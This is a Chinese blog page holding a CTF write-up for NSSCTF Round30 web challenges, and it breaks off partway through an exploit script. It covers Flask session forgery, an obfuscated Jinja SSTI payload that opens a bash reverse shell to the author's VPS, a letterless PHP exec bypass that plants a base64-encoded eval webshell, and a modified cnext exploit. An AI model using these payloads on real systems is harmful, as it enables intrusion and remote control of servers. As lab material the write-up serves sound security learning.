<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="hack_the_world!12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from flask import Flask, request, render_template,render_template_string, url_for, session">
<meta property="og:type" content="article">
<meta property="og:title" content="NSSCTF Round30 Basic双人组队赛">
<meta property="og:url" content="http://example.com/2025/04/07/NSSCTF%20Round30%20Basic%E5%8F%8C%E4%BA%BA%E7%BB%84%E9%98%9F%E8%B5%9B(%E5%BE%85%E5%AE%8C%E6%88%90)/index.html">
<meta property="og:site_name" content="Sauy&#39;s corner">
<meta property="og:description" content="hack_the_world!12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from flask import Flask, request, render_template,render_template_string, url_for, session">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/images/image-20250407005617355.png">
<meta property="og:image" content="http://example.com/images/image-20250407010654354.png">
<meta property="og:image" content="http://example.com/images/image-20250407132323486.png">
<meta property="og:image" content="http://example.com/images/image-20250407132600796.png">
<meta property="og:image" content="http://example.com/images/image-20250407132742355.png">
<meta property="og:image" content="http://example.com/images/image-20250407132906766.png">
<meta property="article:published_time" content="2025-04-07T13:10:58.000Z">
<meta property="article:modified_time" content="2025-04-07T13:50:26.679Z">
<meta property="article:author" content="Sauy">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/image-20250407005617355.png">

<link rel="canonical" href="http://example.com/2025/04/07/NSSCTF%20Round30%20Basic%E5%8F%8C%E4%BA%BA%E7%BB%84%E9%98%9F%E8%B5%9B(%E5%BE%85%E5%AE%8C%E6%88%90)/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>NSSCTF Round30 Basic双人组队赛 | Sauy's corner</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Sauy's corner</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/07/NSSCTF%20Round30%20Basic%E5%8F%8C%E4%BA%BA%E7%BB%84%E9%98%9F%E8%B5%9B(%E5%BE%85%E5%AE%8C%E6%88%90)/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/2.png">
      <meta itemprop="name" content="Sauy">
      <meta itemprop="description" content="World belongs to us.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sauy's corner">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          NSSCTF Round30 Basic双人组队赛
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-04-07 21:10:58 / 修改时间：21:50:26" itemprop="dateCreated datePublished" datetime="2025-04-07T21:10:58+08:00">2025-04-07</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="hack-the-world"><a href="#hack-the-world" class="headerlink" title="hack_the_world!"></a>hack_the_world!</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template,render_template_string, url_for, session</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;NSS&#x27;</span></span><br><span class="line">FILTER_KEYWORDS = [<span class="string">&#x27;Ciallo～(∠・ω ＜）⌒★&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contains_forbidden_keywords</span>(<span class="params">complaint</span>):</span><br><span class="line">    <span class="keyword">for</span> keyword <span class="keyword">in</span> FILTER_KEYWORDS:</span><br><span class="line">        <span class="keyword">if</span> keyword.lower() <span class="keyword">in</span> complaint:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;Gamer&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hack&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hack</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;user&#x27;</span>) != <span class="string">&#x27;hacker&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;die.html&#x27;</span>,user=session.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (abc:=request.headers.get(<span class="string">&#x27;User-Agent&#x27;</span>)) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;fobidden.html&#x27;</span>)</span><br><span class="line">    cmd = request.form.get(<span class="string">&#x27;cmd&#x27;</span>,<span class="string">&#x27;noting&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> (answer:=request.args.get(<span class="string">&#x27;answer&#x27;</span>)) == <span class="string">&#x27;hack_you&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> contains_forbidden_keywords(cmd):</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;forbidden.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            render_template_string(<span class="string">f&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;</span>,cmd=cmd)</span><br><span class="line">    css_url = url_for(<span class="string">&#x27;static&#x27;</span>, filename=<span class="string">&#x27;style.css&#x27;</span>)</span><br><span class="line">    js_url = url_for(<span class="string">&#x27;static&#x27;</span>, filename=<span class="string">&#x27;script.js&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">    &lt;html lang=&quot;zh&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;meta charset=&quot;UTF-8&quot;&gt;  </span></span><br><span class="line"><span class="string">        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;fake world&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;link rel=&quot;stylesheet&quot; href=&quot;<span class="subst">&#123;css_url&#125;</span>&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;!-- No ping No curl No nc , little hacker blind no way--&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;canvas class=&quot;matrix&quot;&gt;&lt;/canvas&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;bg-animation&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;So, what are you trying to do&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p&gt;Just quit, little hacker. There’s nothing for you here.&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;script src=&quot;<span class="subst">&#123;js_url&#125;</span>&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>, css_url=css_url,js_url=js_url)</span><br></pre></td></tr></table></figure>

<p>源码经过审计 可以确定为<code>ssti + flask.session伪造</code></p>
<h4 id="flask伪造"><a href="#flask伪造" class="headerlink" title="flask伪造"></a>flask伪造</h4><p>secret-key:NSS</p>
<p><img src="/images/image-20250407005617355.png" alt="image-20250407005617355"></p>
<p>得到session:<code>eyJ1c2VyIjoiaGFja2VyIn0.Z_IwwQ.fYDi-wb5WZ3xq_Q2oxb3JSg7Qjw</code></p>
<p>修改访问&#x2F;hack</p>
<h4 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h4><p>满足get传入answer&#x3D;hack_you</p>
<p>post传入cmd参数 即ssti注入点 输入49无反应 尝试随便输了几个也没反应</p>
<p>用burp fuzz一下 找到了waf</p>
<p>黑名单:[‘.’,’_’,’]’,’%’,’read’,’mro’]</p>
<p>看响应包也有提示 结合前面除waf以外不回显 判断为盲注</p>
<p>传入payload: 要url编码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum|attr(lipsum|escape|batch(<span class="number">22</span>)|<span class="built_in">list</span>|first|last+lipsum|escape|batch(<span class="number">22</span>)|<span class="built_in">list</span>|first|last+<span class="string">&#x27;globals&#x27;</span>+lipsum|escape|batch(<span class="number">22</span>)|<span class="built_in">list</span>|first|last+lipsum|escape|batch(<span class="number">22</span>)|<span class="built_in">list</span>|first|last)|attr(<span class="string">&#x27;get&#x27;</span>)(lipsum|escape|batch(<span class="number">22</span>)|<span class="built_in">list</span>|first|last+lipsum|escape|batch(<span class="number">22</span>)|<span class="built_in">list</span>|first|last+<span class="string">&#x27;builtins&#x27;</span>+lipsum|escape|batch(<span class="number">22</span>)|<span class="built_in">list</span>|first|last+lipsum|escape|batch(<span class="number">22</span>)|<span class="built_in">list</span>|first|last)|attr(<span class="string">&#x27;get&#x27;</span>)(lipsum|escape|batch(<span class="number">22</span>)|<span class="built_in">list</span>|first|last+lipsum|escape|batch(<span class="number">22</span>)|<span class="built_in">list</span>|first|last+<span class="string">&#x27;import&#x27;</span>+lipsum|escape|batch(<span class="number">22</span>)|<span class="built_in">list</span>|first|last+lipsum|escape|batch(<span class="number">22</span>)|<span class="built_in">list</span>|first|last)(<span class="string">&#x27;os&#x27;</span>)|attr(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&quot;[十六进制编码后的bash -c &#x27;bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1&#x27;]&quot;</span>)|attr(<span class="string">&#x27;r&#x27;</span><span class="string">&#x27;ead&#x27;</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>监听自己端口 vps成功反弹shell</p>
<p><img src="/images/image-20250407010654354.png" alt="image-20250407010654354"></p>
<h2 id="你是谁的菜鸟，又是谁的佬大"><a href="#你是谁的菜鸟，又是谁的佬大" class="headerlink" title="你是谁的菜鸟，又是谁的佬大"></a>你是谁的菜鸟，又是谁的佬大</h2><p>进去无信息 查看源码发现提示</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$NSS</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NSS&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/([A-Z]|;| |\$|~|\#|\(|\^)/i&#x27;</span>, <span class="variable">$NSS</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$NSS</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$Narration</span>;</span><br></pre></td></tr></table></figure>

<p>无字母RCE 一般的都不能用 这里介绍一种方法 具体原理见p神文章 </p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
<p>首先本地起一个html文件</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST 传输数据包 POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://node1.anna.nssctf.cn:28468/&quot;</span> </span></span><br><span class="line"><span class="tag">          <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20250407132323486.png" alt="image-20250407132323486"></p>
<p>上传一个文件 1.txt</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin</span><br><span class="line">echo &quot;PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=&quot; | base64 -d &gt; shell.php     //写一句话木马到shell.php文件</span><br></pre></td></tr></table></figure>

<p>上传后自动跳转到网页 抓包即可</p>
<p>get传入?NSS&#x3D;.%09&#x2F;???&#x2F;????????[@-[]</p>
<p><img src="/images/image-20250407132600796.png" alt="image-20250407132600796"></p>
<p>再访问shell.php 成功访问 写马成功 连接蚁剑</p>
<p><img src="/images/image-20250407132742355.png" alt="image-20250407132742355"></p>
<p>根目录找flag文件即可</p>
<p><img src="/images/image-20250407132906766.png" alt="image-20250407132906766"></p>
<h3 id="你也是迷宫高手吗"><a href="#你也是迷宫高手吗" class="headerlink" title="你也是迷宫高手吗"></a>你也是迷宫高手吗</h3><p>进入靶机发现是个小游戏 限时10s完成10个迷宫 迷宫随机 很明显的reqeust库写脚本 非常考验写脚本*(调教ai的能力×*</p>
<p>笔者不想多写 详见官方wp <a target="_blank" rel="noopener" href="https://www.nssctf.cn/note/set/12045">https://www.nssctf.cn/note/set/12045</a></p>
<h2 id="简单的PHP"><a href="#简单的PHP" class="headerlink" title="简单的PHP"></a>简单的PHP</h2><p>php类型题 第一关</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;jeer.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$A</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$B</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$C</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//第一关</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;one&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>] ?? <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="variable">$add</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">1</span>); </span><br><span class="line">    <span class="variable">$add</span>++;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$add</span>) &gt; <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="variable">$A</span> = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$one</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$begin</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//第二关</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;two&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$comment</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;comment&#x27;</span>] ?? <span class="string">&#x27;echo(114514)&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(|;| |\$|~|\#|`|\&#x27;|\&quot;|\*|?|&lt;|&gt;|\r|\n|\^)/i&#x27;</span>, <span class="variable">$comment</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$comment</span>) &lt; <span class="number">20</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&#x27;$B = 1;&#x27;</span>.<span class="variable">$comment</span>.<span class="string">&#x27;;echo $two;die();&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (<span class="built_in">Error</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$boom</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//第三关</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;three&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;one&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;two&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$a1</span>=(<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;one&#x27;</span>];</span><br><span class="line">        <span class="variable">$a2</span>=(<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;two&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a1</span> !== <span class="variable">$a2</span> &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$a1</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$a2</span>))&#123;</span><br><span class="line">            <span class="variable">$C</span> = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$three</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$A</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$B</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$C</span> == <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>前面的不赘述 就考cve搓脚本啦 之前ghctf的时候刚刚好把改好的拿来用</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/ambionics/cnext-exploits">https://github.com/ambionics/cnext-exploits</a></p>
<p>虚拟机clone下来 然后把里面的脚本改为下面这个 执行命令就好</p>
<p>脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ConnectionError, ChunkedEncodingError</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ten <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">HEAP_SIZE = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">BUG = <span class="string">&quot;劄&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Remote</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A helper class to send the payload and download files.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The logic of the exploit is always the same, but the exploit needs to know how to</span></span><br><span class="line"><span class="string">    download files (/proc/self/maps and libc) and how to send the payload.</span></span><br><span class="line"><span 